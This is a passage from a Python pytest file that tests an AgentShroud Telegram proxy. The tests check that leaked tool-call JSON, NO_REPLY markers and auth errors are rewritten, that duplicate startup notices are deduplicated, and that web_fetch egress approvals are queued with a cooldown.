        ).encode()
        result = urllib.parse.parse_qs(
            (await proxy._filter_outbound(form_body, "application/x-www-form-urlencoded")).decode()
        )
        text = result.get("message", [""])[0]
        assert "skill.md" not in text.lower()
        assert "/healthcheck" in text.lower()

    @pytest.mark.asyncio
    async def test_ollama_auth_required_error_is_sanitized(self):
        """Ollama auth errors should map to concise operator guidance."""
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        body = json.dumps(
            {
                "chat_id": "8096968754",
                "text": (
                    "Unknown model: ollama/qwen2.5-coder:7b. "
                    "Ollama requires authentication to be registered as a provider."
                ),
            }
        ).encode()
        result = json.loads(await proxy._filter_outbound(body, "application/json"))
        assert "requires authentication" not in result["text"].lower()
        assert "ollama-local" in result["text"]
        assert "switch_model.sh gemini" in result["text"]
        assert "cloud gemini" not in result["text"].lower()

    @pytest.mark.asyncio
    async def test_urlencoded_draft_payload_tool_json_is_rewritten(self):
        """Form-encoded draft payloads must not leak raw tool-call JSON."""
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        raw_text = '{"name":"sessions_spawn","arguments":{"agentId":"acp.healthcheck"}}'
        body = urllib.parse.urlencode({"chat_id": "8096968754", "text": raw_text}).encode()
        result = await proxy._filter_outbound(body, "application/x-www-form-urlencoded")
        parsed = dict(urllib.parse.parse_qsl(result.decode(), keep_blank_values=True))
        assert "sessions_spawn" not in parsed.get("text", "")
        assert "healthcheck started" in parsed.get("text", "").lower()

    @pytest.mark.asyncio
    async def test_json_without_content_type_is_still_filtered(self):
        """Missing content-type must not bypass outbound JSON leak filtering."""
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        body = json.dumps(
            {
                "chat_id": "8096968754",
                "text": '{"name":"NO_REPLY","arguments":{}}',
            }
        ).encode()
        result = json.loads(await proxy._filter_outbound(body, None))
        assert "still processing" in result["text"].lower()

    @pytest.mark.asyncio
    async def test_urlencoded_without_content_type_draft_is_still_filtered(self):
        """Missing content-type must not bypass form draft leak filtering."""
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        body = urllib.parse.urlencode(
            {
                "chat_id": "8096968754",
                "draft": '{"name":"NO_REPLY","arguments":{}}',
            }
        ).encode()
        result = await proxy._filter_outbound(body, None)
        parsed = dict(urllib.parse.parse_qsl(result.decode(), keep_blank_values=True))
        assert "still processing" in parsed.get("draft", "").lower()

    @pytest.mark.asyncio
    async def test_urlencoded_plain_no_reply_is_still_filtered(self):
        """Form payload plain NO_REPLY should map to deterministic wait guidance."""
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        body = urllib.parse.urlencode(
            {
                "chat_id": "8096968754",
                "text": "NO_REPLY",
            }
        ).encode()
        result = await proxy._filter_outbound(body, "application/x-www-form-urlencoded")
        parsed = dict(urllib.parse.parse_qsl(result.decode(), keep_blank_values=True))
        assert "still processing" in parsed.get("text", "").lower()

    @pytest.mark.asyncio
    async def test_urlencoded_plain_no_reply_with_punctuation_is_still_filtered(self):
        """Form payload NO_REPLY punctuation variant should still normalize."""
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        body = urllib.parse.urlencode(
            {
                "chat_id": "8096968754",
                "text": "(NO_REPLY!)",
            }
        ).encode()
        result = await proxy._filter_outbound(body, "application/x-www-form-urlencoded")
        parsed = dict(urllib.parse.parse_qsl(result.decode(), keep_blank_values=True))
        assert "still processing" in parsed.get("text", "").lower()

    @pytest.mark.asyncio
    async def test_urlencoded_without_content_type_caption_is_still_filtered(self):
        """Missing content-type must not bypass form caption leak filtering."""
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        body = urllib.parse.urlencode(
            {
                "chat_id": "8096968754",
                "caption": '{"name":"sessions_spawn","arguments":{"agentId":"acp.healthcheck"}}',
            }
        ).encode()
        result = await proxy._filter_outbound(body, None)
        parsed = dict(urllib.parse.parse_qsl(result.decode(), keep_blank_values=True))
        assert "healthcheck started" in parsed.get("caption", "").lower()
        assert "sessions_spawn" not in parsed.get("caption", "")

    @pytest.mark.asyncio
    async def test_urlencoded_without_content_type_empty_text_with_caption_is_still_filtered(self):
        """Missing content-type + empty text must not bypass caption filtering for collaborators."""
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        body = urllib.parse.urlencode(
            {
                "chat_id": "7614658040",
                "text": " ",
                "caption": '{"name":"sessions_spawn","arguments":{"agentId":"acp.healthcheck"}}',
            }
        ).encode()
        result = await proxy._filter_outbound(body, None)
        parsed = dict(urllib.parse.parse_qsl(result.decode(), keep_blank_values=True))
        assert "protected by agentshroud" in parsed.get("caption", "").lower()
        assert "sessions_spawn" not in parsed.get("caption", "").lower()

    @pytest.mark.asyncio
    async def test_json_without_content_type_empty_text_with_caption_is_still_filtered(self):
        """Missing content-type + empty text must not bypass caption filtering (json path)."""
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        body = json.dumps(
            {
                "chat_id": "7614658040",
                "text": "",
                "caption": '{"name":"sessions_spawn","arguments":{"agentId":"acp.healthcheck"}}',
            }
        ).encode()
        result = json.loads(await proxy._filter_outbound(body, None))
        assert "protected by agentshroud" in result.get("caption", "").lower()
        assert "sessions_spawn" not in result.get("caption", "").lower()

    @pytest.mark.asyncio
    async def test_urlencoded_without_content_type_empty_text_with_message_is_still_filtered(self):
        """Missing content-type + empty text must not bypass message filtering for collaborators."""
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        body = urllib.parse.urlencode(
            {
                "chat_id": "7614658040",
                "text": "",
                "message": '{"name":"sessions_spawn","arguments":{"agentId":"acp.healthcheck"}}',
            }
        ).encode()
        result = await proxy._filter_outbound(body, None)
        parsed = dict(urllib.parse.parse_qsl(result.decode(), keep_blank_values=True))
        assert "protected by agentshroud" in parsed.get("message", "").lower()
        assert "sessions_spawn" not in parsed.get("message", "").lower()

    @pytest.mark.asyncio
    async def test_json_without_content_type_empty_text_with_message_is_still_filtered(self):
        """Missing content-type + empty text must not bypass message filtering (json path)."""
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        body = json.dumps(
            {
                "chat_id": "7614658040",
                "text": " ",
                "message": '{"name":"sessions_spawn","arguments":{"agentId":"acp.healthcheck"}}',
            }
        ).encode()
        result = json.loads(await proxy._filter_outbound(body, None))
        assert "protected by agentshroud" in result.get("message", "").lower()
        assert "sessions_spawn" not in result.get("message", "").lower()

    @pytest.mark.asyncio
    async def test_urlencoded_without_content_type_empty_text_with_content_is_still_filtered(self):
        """Missing content-type + empty text must not bypass content filtering for collaborators."""
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        body = urllib.parse.urlencode(
            {
                "chat_id": "7614658040",
                "text": "",
                "content": '{"name":"sessions_spawn","arguments":{"agentId":"acp.healthcheck"}}',
            }
        ).encode()
        result = await proxy._filter_outbound(body, None)
        parsed = dict(urllib.parse.parse_qsl(result.decode(), keep_blank_values=True))
        assert "protected by agentshroud" in parsed.get("content", "").lower()
        assert "sessions_spawn" not in parsed.get("content", "").lower()

    @pytest.mark.asyncio
    async def test_json_without_content_type_empty_text_with_content_is_still_filtered(self):
        """Missing content-type + empty text must not bypass content filtering (json path)."""
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        body = json.dumps(
            {
                "chat_id": "7614658040",
                "text": " ",
                "content": '{"name":"sessions_spawn","arguments":{"agentId":"acp.healthcheck"}}',
            }
        ).encode()
        result = json.loads(await proxy._filter_outbound(body, None))
        assert "protected by agentshroud" in result.get("content", "").lower()
        assert "sessions_spawn" not in result.get("content", "").lower()

    @pytest.mark.asyncio
    async def test_urlencoded_without_content_type_empty_text_with_draft_is_still_filtered(self):
        """Missing content-type + empty text must not bypass draft filtering for collaborators."""
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        body = urllib.parse.urlencode(
            {
                "chat_id": "7614658040",
                "text": "",
                "draft": '{"name":"sessions_spawn","arguments":{"agentId":"acp.healthcheck"}}',
            }
        ).encode()
        result = await proxy._filter_outbound(body, None)
        parsed = dict(urllib.parse.parse_qsl(result.decode(), keep_blank_values=True))
        assert "protected by agentshroud" in parsed.get("draft", "").lower()
        assert "sessions_spawn" not in parsed.get("draft", "").lower()

    @pytest.mark.asyncio
    async def test_json_without_content_type_empty_text_with_draft_is_still_filtered(self):
        """Missing content-type + empty text must not bypass draft filtering (json path)."""
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        body = json.dumps(
            {
                "chat_id": "7614658040",
                "text": " ",
                "draft": '{"name":"sessions_spawn","arguments":{"agentId":"acp.healthcheck"}}',
            }
        ).encode()
        result = json.loads(await proxy._filter_outbound(body, None))
        assert "protected by agentshroud" in result.get("draft", "").lower()
        assert "sessions_spawn" not in result.get("draft", "").lower()

    @pytest.mark.asyncio
    async def test_urlencoded_collaborator_no_reply_gets_protected_notice(self):
        """Collaborator form payloads should get protected notice, not suppression."""
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        body = urllib.parse.urlencode(
            {
                "chat_id": "7614658040",
                "text": '{"name":"NO_REPLY","arguments":{}}',
            }
        ).encode()
        result = await proxy._filter_outbound(body, "application/x-www-form-urlencoded")
        parsed = dict(urllib.parse.parse_qsl(result.decode(), keep_blank_values=True))
        assert "protected by agentshroud" in parsed.get("text", "").lower()
        assert "__AGENTSHROUD_SUPPRESS_OUTBOUND__".lower() not in parsed.get("text", "").lower()

    @pytest.mark.asyncio
    async def test_html_parse_mode_removed_for_redaction_placeholders(self):
        """HTML parse mode should be dropped for redaction placeholder tokens."""
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        body = json.dumps(
            {
                "chat_id": "7614658040",
                "text": "Contact: <EMAIL_ADDRESS>",
                "parse_mode": "HTML",
            }
        ).encode()
        result = json.loads(await proxy._filter_outbound(body, "application/json"))
        assert "parse_mode" not in result
        assert "<EMAIL_ADDRESS>" in result["text"]

    @pytest.mark.asyncio
    async def test_html_parse_mode_preserved_without_redaction_placeholders(self):
        """Owner HTML formatting should preserve parse_mode."""
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        body = json.dumps(
            {
                "chat_id": "8096968754",
                "text": "<b>Status</b>: OK",
                "parse_mode": "HTML",
            }
        ).encode()
        result = json.loads(await proxy._filter_outbound(body, "application/json"))
        assert result.get("parse_mode") == "HTML"

    @pytest.mark.asyncio
    async def test_collaborator_html_code_markup_is_stripped_and_parse_mode_removed(self):
        """Collaborator outbound HTML code/pre markup should be stripped to plain text."""
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        body = json.dumps(
            {
                "chat_id": "7614658040",
                "text": "Use <code>tg://user?id=123</code> now.",
                "parse_mode": "HTML",
            }
        ).encode()
        result = json.loads(await proxy._filter_outbound(body, "application/json"))
        assert "parse_mode" not in result
        assert "<code>" not in result["text"].lower()
        assert "</code>" not in result["text"].lower()
        assert "tg://user?id=123" in result["text"]

    @pytest.mark.asyncio
    async def test_proxy_request_sends_no_reply_wait_message_once(self, monkeypatch):
        """First NO_REPLY payload should send safe wait guidance to Telegram."""
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        calls = {"count": 0, "last_body": b""}

        async def _mock_forward(_url, body, _content_type):
            calls["count"] += 1
            calls["last_body"] = body
            return {"ok": True, "result": {"message_id": calls["count"]}}

        monkeypatch.setattr(proxy, "_forward_to_telegram", _mock_forward)

        body = json.dumps(
            {"chat_id": "8096968754", "text": '{"name":"NO_REPLY","arguments":{}}'}
        ).encode()
        result = await proxy.proxy_request(
            bot_token="dummy",
            method="sendMessage",
            body=body,
            content_type="application/json",
        )
        assert result["ok"] is True
        assert calls["count"] == 1
        forwarded = json.loads(calls["last_body"])
        assert "still processing" in forwarded.get("text", "").lower()

    @pytest.mark.asyncio
    async def test_proxy_request_duplicate_no_reply_messages_return_deterministic_reply(
        self, monkeypatch
    ):
        """Repeated NO_REPLY payloads should still return deterministic non-empty replies."""
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        calls = {"count": 0}

        async def _mock_forward(*_args, **_kwargs):
            calls["count"] += 1
            return {"ok": True, "result": {"message_id": calls["count"]}}

        monkeypatch.setattr(proxy, "_forward_to_telegram", _mock_forward)

        body = json.dumps(
            {"chat_id": "8096968754", "text": '{"name":"NO_REPLY","arguments":{}}'}
        ).encode()
        first = await proxy.proxy_request(
            bot_token="dummy",
            method="sendMessage",
            body=body,
            content_type="application/json",
        )
        second = await proxy.proxy_request(
            bot_token="dummy",
            method="sendMessage",
            body=body,
            content_type="application/json",
        )
        assert first.get("ok") is True
        assert second.get("ok") is True
        assert second.get("result", {}).get("suppressed") is not True
        assert calls["count"] == 2

    @pytest.mark.asyncio
    async def test_proxy_request_suppresses_duplicate_system_startup_notice(self, monkeypatch):
        """System startup notice should be deduplicated in a short cooldown window."""
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        calls = {"count": 0}

        async def _mock_forward(*_args, **_kwargs):
            calls["count"] += 1
            return {"ok": True, "result": {"message_id": calls["count"]}}

        monkeypatch.setattr(proxy, "_forward_to_telegram", _mock_forward)

        body = json.dumps({"chat_id": "8096968754", "text": "🛡️ AgentShroud online"}).encode()
        first = await proxy.proxy_request(
            bot_token="dummy",
            method="sendMessage",
            body=body,
            content_type="application/json",
            is_system=True,
        )
        second = await proxy.proxy_request(
            bot_token="dummy",
            method="sendMessage",
            body=body,
            content_type="application/json",
            is_system=True,
        )

        assert first.get("ok") is True
        assert second.get("ok") is True
        assert second.get("result", {}).get("suppressed") is True

    @pytest.mark.asyncio
    async def test_proxy_request_suppresses_duplicate_startup_notice_without_system_flag(
        self, monkeypatch
    ):
        """Startup notice dedupe should still apply when sender forgets system header."""
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        calls = {"count": 0}

        async def _mock_forward(*_args, **_kwargs):
            calls["count"] += 1
            return {"ok": True, "result": {"message_id": calls["count"]}}

        monkeypatch.setattr(proxy, "_forward_to_telegram", _mock_forward)

        body = json.dumps({"chat_id": "8096968754", "text": "🛡️ AgentShroud online"}).encode()
        first = await proxy.proxy_request(
            bot_token="dummy",
            method="sendMessage",
            body=body,
            content_type="application/json",
            is_system=False,
        )
        second = await proxy.proxy_request(
            bot_token="dummy",
            method="sendMessage",
            body=body,
            content_type="application/json",
            is_system=False,
        )

        assert first.get("ok") is True
        assert second.get("ok") is True
        assert second.get("result", {}).get("suppressed") is True
        assert calls["count"] == 1

    @pytest.mark.asyncio
    async def test_proxy_request_allows_distinct_system_notices(self, monkeypatch):
        """Different system notices should both be forwarded."""
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        calls = {"count": 0}

        async def _mock_forward(*_args, **_kwargs):
            calls["count"] += 1
            return {"ok": True, "result": {"message_id": calls["count"]}}

        monkeypatch.setattr(proxy, "_forward_to_telegram", _mock_forward)

        online = json.dumps({"chat_id": "8096968754", "text": "🛡️ AgentShroud online"}).encode()
        shutdown = json.dumps(
            {"chat_id": "8096968754", "text": "🔴 AgentShroud shutting down"}
        ).encode()

        first = await proxy.proxy_request(
            bot_token="dummy",
            method="sendMessage",
            body=online,
            content_type="application/json",
            is_system=True,
        )
        second = await proxy.proxy_request(
            bot_token="dummy",
            method="sendMessage",
            body=shutdown,
            content_type="application/json",
            is_system=True,
        )

        assert first.get("ok") is True
        assert second.get("ok") is True
        assert second.get("result", {}).get("suppressed") is not True
        assert calls["count"] == 2

    @pytest.mark.asyncio
    async def test_proxy_request_suppresses_duplicate_starting_notice(self, monkeypatch):
        """Starting notices should be deduplicated in cooldown window."""
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        calls = {"count": 0}

        async def _mock_forward(*_args, **_kwargs):
            calls["count"] += 1
            return {"ok": True, "result": {"message_id": calls["count"]}}

        monkeypatch.setattr(proxy, "_forward_to_telegram", _mock_forward)

        body = json.dumps({"chat_id": "8096968754", "text": "🟡 AgentShroud starting"}).encode()
        first = await proxy.proxy_request(
            bot_token="dummy",
            method="sendMessage",
            body=body,
            content_type="application/json",
            is_system=True,
        )
        second = await proxy.proxy_request(
            bot_token="dummy",
            method="sendMessage",
            body=body,
            content_type="application/json",
            is_system=True,
        )

        assert first.get("ok") is True
        assert second.get("ok") is True
        assert second.get("result", {}).get("suppressed") is True
        assert calls["count"] == 1

    @pytest.mark.asyncio
    async def test_proxy_request_suppresses_starting_notice_emoji_variants(self, monkeypatch):
        """Starting notice dedupe should tolerate emoji variation drift."""
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        calls = {"count": 0}

        async def _mock_forward(*_args, **_kwargs):
            calls["count"] += 1
            return {"ok": True, "result": {"message_id": calls["count"]}}

        monkeypatch.setattr(proxy, "_forward_to_telegram", _mock_forward)

        first_body = json.dumps(
            {"chat_id": "8096968754", "text": "🟡 AgentShroud starting"}
        ).encode()
        second_body = json.dumps(
            {"chat_id": "8096968754", "text": "🟡️ AgentShroud starting"}
        ).encode()

        first = await proxy.proxy_request(
            bot_token="dummy",
            method="sendMessage",
            body=first_body,
            content_type="application/json",
            is_system=True,
        )
        second = await proxy.proxy_request(
            bot_token="dummy",
            method="sendMessage",
            body=second_body,
            content_type="application/json",
            is_system=True,
        )

        assert first.get("ok") is True
        assert second.get("ok") is True
        assert second.get("result", {}).get("suppressed") is True
        assert calls["count"] == 1

    @pytest.mark.asyncio
    async def test_proxy_request_allows_starting_then_online_sequence(self, monkeypatch):
        """Starting and online notices are distinct and should both forward."""
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        calls = {"count": 0}

        async def _mock_forward(*_args, **_kwargs):
            calls["count"] += 1
            return {"ok": True, "result": {"message_id": calls["count"]}}

        monkeypatch.setattr(proxy, "_forward_to_telegram", _mock_forward)

        starting = json.dumps({"chat_id": "8096968754", "text": "🟡 AgentShroud starting"}).encode()
        online = json.dumps({"chat_id": "8096968754", "text": "🛡️ AgentShroud online"}).encode()

        first = await proxy.proxy_request(
            bot_token="dummy",
            method="sendMessage",
            body=starting,
            content_type="application/json",
            is_system=True,
        )
        second = await proxy.proxy_request(
            bot_token="dummy",
            method="sendMessage",
            body=online,
            content_type="application/json",
            is_system=True,
        )

        assert first.get("ok") is True
        assert second.get("ok") is True
        assert second.get("result", {}).get("suppressed") is not True
        assert calls["count"] == 2

    @pytest.mark.asyncio
    async def test_proxy_request_suppresses_duplicate_delayed_starting_notice(self, monkeypatch):
        """Delayed-starting notices should also be deduplicated in cooldown window."""
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        calls = {"count": 0}

        async def _mock_forward(*_args, **_kwargs):
            calls["count"] += 1
            return {"ok": True, "result": {"message_id": calls["count"]}}

        monkeypatch.setattr(proxy, "_forward_to_telegram", _mock_forward)

        body = json.dumps(
            {"chat_id": "8096968754", "text": "🟠 AgentShroud starting (readiness delayed)"}
        ).encode()
        first = await proxy.proxy_request(
            bot_token="dummy",
            method="sendMessage",
            body=body,
            content_type="application/json",
            is_system=True,
        )
        second = await proxy.proxy_request(
            bot_token="dummy",
            method="sendMessage",
            body=body,
            content_type="application/json",
            is_system=True,
        )

        assert first.get("ok") is True
        assert second.get("ok") is True
        assert second.get("result", {}).get("suppressed") is True
        assert calls["count"] == 1

    @pytest.mark.asyncio
    async def test_proxy_request_suppresses_delayed_starting_notice_emoji_variants(
        self, monkeypatch
    ):
        """Delayed-starting dedupe should tolerate emoji variation drift."""
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        calls = {"count": 0}

        async def _mock_forward(*_args, **_kwargs):
            calls["count"] += 1
            return {"ok": True, "result": {"message_id": calls["count"]}}

        monkeypatch.setattr(proxy, "_forward_to_telegram", _mock_forward)

        first_body = json.dumps(
            {"chat_id": "8096968754", "text": "🟠 AgentShroud starting (readiness delayed)"}
        ).encode()
        second_body = json.dumps(
            {"chat_id": "8096968754", "text": "🟠️ AgentShroud starting (readiness delayed)"}
        ).encode()

        first = await proxy.proxy_request(
            bot_token="dummy",
            method="sendMessage",
            body=first_body,
            content_type="application/json",
            is_system=True,
        )
        second = await proxy.proxy_request(
            bot_token="dummy",
            method="sendMessage",
            body=second_body,
            content_type="application/json",
            is_system=True,
        )

        assert first.get("ok") is True
        assert second.get("ok") is True
        assert second.get("result", {}).get("suppressed") is True
        assert calls["count"] == 1

    @pytest.mark.asyncio
    async def test_proxy_request_allows_delayed_starting_then_online_sequence(self, monkeypatch):
        """Delayed-starting and online notices are distinct and should both forward."""
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        calls = {"count": 0}

        async def _mock_forward(*_args, **_kwargs):
            calls["count"] += 1
            return {"ok": True, "result": {"message_id": calls["count"]}}

        monkeypatch.setattr(proxy, "_forward_to_telegram", _mock_forward)

        delayed = json.dumps(
            {"chat_id": "8096968754", "text": "🟠 AgentShroud starting (readiness delayed)"}
        ).encode()
        online = json.dumps({"chat_id": "8096968754", "text": "🛡️ AgentShroud online"}).encode()

        first = await proxy.proxy_request(
            bot_token="dummy",
            method="sendMessage",
            body=delayed,
            content_type="application/json",
            is_system=True,
        )
        second = await proxy.proxy_request(
            bot_token="dummy",
            method="sendMessage",
            body=online,
            content_type="application/json",
            is_system=True,
        )

        assert first.get("ok") is True
        assert second.get("ok") is True
        assert second.get("result", {}).get("suppressed") is not True
        assert calls["count"] == 2

    @pytest.mark.asyncio
    async def test_proxy_request_suppresses_startup_notice_emoji_variants(self, monkeypatch):
        """Startup notice dedupe should tolerate emoji variation drift."""
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        calls = {"count": 0}

        async def _mock_forward(*_args, **_kwargs):
            calls["count"] += 1
            return {"ok": True, "result": {"message_id": calls["count"]}}

        monkeypatch.setattr(proxy, "_forward_to_telegram", _mock_forward)

        first_body = json.dumps({"chat_id": "8096968754", "text": "🛡️ AgentShroud online"}).encode()
        second_body = json.dumps({"chat_id": "8096968754", "text": "🛡 AgentShroud online"}).encode()

        first = await proxy.proxy_request(
            bot_token="dummy",
            method="sendMessage",
            body=first_body,
            content_type="application/json",
            is_system=True,
        )
        second = await proxy.proxy_request(
            bot_token="dummy",
            method="sendMessage",
            body=second_body,
            content_type="application/json",
            is_system=True,
        )

        assert first.get("ok") is True
        assert second.get("ok") is True
        assert second.get("result", {}).get("suppressed") is True
        assert calls["count"] == 1

    @pytest.mark.asyncio
    async def test_form_payload_with_draft_field_is_filtered(self):
        """Form payload using draft field should still suppress tool-call JSON."""
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        raw_text = '{"name":"sessions_spawn","arguments":{"agentId":"acp.healthcheck"}}'
        body = urllib.parse.urlencode({"chat_id": "8096968754", "draft": raw_text}).encode()
        result = await proxy._filter_outbound(body, "application/x-www-form-urlencoded")
        parsed = dict(urllib.parse.parse_qsl(result.decode(), keep_blank_values=True))
        assert "sessions_spawn" not in parsed.get("draft", "")
        assert "healthcheck started" in parsed.get("draft", "").lower()

    @pytest.mark.asyncio
    async def test_embedded_tool_call_json_is_removed_from_text(self):
        """If tool-call JSON is embedded in prose, strip JSON block before delivery."""
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        body = json.dumps(
            {
                "chat_id": "8096968754",
                "text": (
                    "please check weather for pittsburgh\n\n"
                    '{"name": "web_fetch", "arguments": {"url": "https://weather.com"}}'
                ),
            }
        ).encode()
        result = json.loads(await proxy._filter_outbound(body, "application/json"))
        assert "web_fetch" not in result["text"]
        assert "arguments" not in result["text"]
        assert "please check weather" in result["text"].lower()

    @pytest.mark.asyncio
    async def test_embedded_web_fetch_json_queues_approval_when_available(self, monkeypatch):
        """Embedded web_fetch JSON should still queue interactive egress approval."""
        called = {"value": False}

        class FakeEgress:
            async def check_async(self, **kwargs):
                called["value"] = True
                called["kwargs"] = kwargs
                return SimpleNamespace(action="deny")

        from gateway.ingest_api import state as state_module

        monkeypatch.setattr(
            state_module,
            "app_state",
            SimpleNamespace(egress_filter=FakeEgress()),
        )
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        body = json.dumps(
            {
                "chat_id": "8096968754",
                "text": (
                    "please check weather for pittsburgh\n\n"
                    '{"name":"web_fetch","arguments":{"url":"https://weather.com/weather/today"}}'
                ),
            }
        ).encode()
        result = json.loads(await proxy._filter_outbound(body, "application/json"))
        await asyncio.sleep(0)
        assert called["value"] is True
        assert called["kwargs"]["tool_name"] == "web_fetch"
        assert "approval request queued" in result["text"].lower()
        assert "web_fetch" not in result["text"]

    @pytest.mark.asyncio
    async def test_raw_web_fetch_json_is_rewritten_to_actionable_guidance(self):
        """Pure web_fetch tool-call JSON should be rewritten to user guidance."""
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        body = json.dumps(
            {
                "chat_id": "8096968754",
                "text": '{"name":"web_fetch","arguments":{"url":"https://weather.com"}}',
            }
        ).encode()
        result = json.loads(await proxy._filter_outbound(body, "application/json"))
        assert "raw tool json" in result["text"].lower()
        assert "switch_model.sh" in result["text"]

    @pytest.mark.asyncio
    async def test_raw_web_fetch_json_queues_egress_approval_when_available(self, monkeypatch):
        """Raw web_fetch JSON should queue interactive egress approval for the destination."""
        called = {"value": False}

        class FakeEgress:
            async def check_async(self, **kwargs):
                called["value"] = True
                called["kwargs"] = kwargs
                return SimpleNamespace(action="deny")

        from gateway.ingest_api import state as state_module

        monkeypatch.setattr(
            state_module,
            "app_state",
            SimpleNamespace(egress_filter=FakeEgress()),
        )
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        body = json.dumps(
            {
                "chat_id": "8096968754",
                "text": '{"name":"web_fetch","arguments":{"url":"https://weather.com/weather/today"}}',
            }
        ).encode()
        result = json.loads(await proxy._filter_outbound(body, "application/json"))
        await asyncio.sleep(0)
        assert called["value"] is True
        assert called["kwargs"]["tool_name"] == "web_fetch"
        assert called["kwargs"]["agent_id"] == "telegram_web_fetch:8096968754"
        assert "approval request queued" in result["text"].lower()

    @pytest.mark.asyncio
    async def test_raw_web_fetch_json_approval_queue_is_cooldown_deduped(self, monkeypatch):
        """Repeated identical web_fetch leaks should not spam approval queue."""
        calls = {"count": 0}

        class FakeEgress:
            async def check_async(self, **_kwargs):
                calls["count"] += 1
                return SimpleNamespace(action="deny")

        from gateway.ingest_api import state as state_module

        monkeypatch.setattr(
            state_module,
            "app_state",
            SimpleNamespace(egress_filter=FakeEgress()),
        )

        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        proxy._web_fetch_approval_cooldown_seconds = 600.0
        body = json.dumps(
            {
                "chat_id": "8096968754",
                "text": '{"name":"web_fetch","arguments":{"url":"https://weather.com/weather/today"}}',
            }
        ).encode()

        first = json.loads(await proxy._filter_outbound(body, "application/json"))
        second = json.loads(await proxy._filter_outbound(body, "application/json"))
        await asyncio.sleep(0)

        assert calls["count"] == 1
        assert "approval request queued" in first["text"].lower()
        assert "approval request queued" not in second["text"].lower()

    @pytest.mark.asyncio
    async def test_raw_web_fetch_json_approval_cooldown_is_scheme_port_scoped(self, monkeypatch):
        """Cooldown dedupe must not suppress approvals when scheme/port risk changes."""
        calls = {"count": 0}

        class FakeEgress:
            async def check_async(self, **_kwargs):
                calls["count"] += 1
                return SimpleNamespace(action="deny")

        from gateway.ingest_api import state as state_module

        monkeypatch.setattr(
            state_module,
            "app_state",
            SimpleNamespace(egress_filter=FakeEgress()),
        )

        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        proxy._web_fetch_approval_cooldown_seconds = 600.0
        https_body = json.dumps(
            {
                "chat_id": "8096968754",
                "text": '{"name":"web_fetch","arguments":{"url":"https://weather.com/weather/today"}}',
            }
        ).encode()
        http_body = json.dumps(
            {
                "chat_id": "8096968754",
                "text": '{"name":"web_fetch","arguments":{"url":"http://weather.com/weather/today"}}',
            }
        ).encode()

        first = json.loads(await proxy._filter_outbound(https_body, "application/json"))
        second = json.loads(await proxy._filter_outbound(http_body, "application/json"))
        await asyncio.sleep(0)

        assert calls["count"] == 2
        assert "approval request queued" in first["text"].lower()
        assert "approval request queued" in second["text"].lower()

    @pytest.mark.asyncio
    async def test_raw_web_fetch_json_approval_prunes_expired_cooldown_entries(self, monkeypatch):
        """Cooldown cache should prune expired entries when size exceeds threshold."""
        calls = {"count": 0}

        class FakeEgress:
            async def check_async(self, **_kwargs):
                calls["count"] += 1
                return SimpleNamespace(action="deny")

        from gateway.ingest_api import state as state_module

        monkeypatch.setattr(
            state_module,
            "app_state",
            SimpleNamespace(egress_filter=FakeEgress()),
        )

        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        now = time.time()
        proxy._recent_web_fetch_approval_until = {
            (f"chat-{i}", "https", f"example{i}.com", 443): now - 10 for i in range(1025)
        }
        proxy._recent_web_fetch_approval_until[("live", "https", "live.example.com", 443)] = (
            now + 600
        )
        body = json.dumps(
            {
                "chat_id": "8096968754",
                "text": '{"name":"web_fetch","arguments":{"url":"https://weather.com/weather/today"}}',
            }
        ).encode()

        result = json.loads(await proxy._filter_outbound(body, "application/json"))
        await asyncio.sleep(0)

        assert calls["count"] == 1
        assert "approval request queued" in result["text"].lower()
        assert ("live", "https", "live.example.com", 443) in proxy._recent_web_fetch_approval_until
        assert len(proxy._recent_web_fetch_approval_until) == 2

    @pytest.mark.asyncio
    async def test_raw_web_fetch_json_approval_normalizes_leading_dot_domain(self, monkeypatch):
        """Malformed host with leading dot should still queue approval for normalized domain."""
        called = {"value": False}

        class FakeEgress:
            async def check_async(self, **kwargs):
                called["value"] = True
                called["kwargs"] = kwargs
                return SimpleNamespace(action="deny")

        from gateway.ingest_api import state as state_module

        monkeypatch.setattr(
            state_module,
            "app_state",
            SimpleNamespace(egress_filter=FakeEgress()),
        )
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        body = json.dumps(
            {
                "chat_id": "8096968754",
